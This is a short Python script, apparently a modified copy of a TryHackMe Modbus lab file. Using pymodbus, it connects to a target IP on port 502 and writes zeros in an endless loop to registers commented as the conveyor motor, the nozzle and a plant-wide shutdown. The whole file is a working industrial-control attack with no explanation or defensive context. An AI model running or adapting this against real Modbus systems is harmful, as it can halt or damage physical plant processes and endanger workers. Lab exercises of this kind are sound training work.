#!/usr/bin/env python3

# Modified version of the TryHackMe Modbus attack_shutdown.py file
# This version uses pymodbus 3.2 instead of 1.52

import sys
import time
from pymodbus.client import ModbusTcpClient

if len(sys.argv) != 2:
    print("Error: Incorrect arguments given")
    print("Usage: ./attack_shutdown.py ip_address")
    sys.exit()

ip = sys.argv[1]

client = ModbusTcpClient(ip, port=502)
client.connect()

print('Closing down plant')

while True:
    client.write_register(3, 0) # Stop the conveyor belt motor
    client.write_register(4, 0) # Close the nozzle
    client.write_register(16, 0) # Shutdown the plant
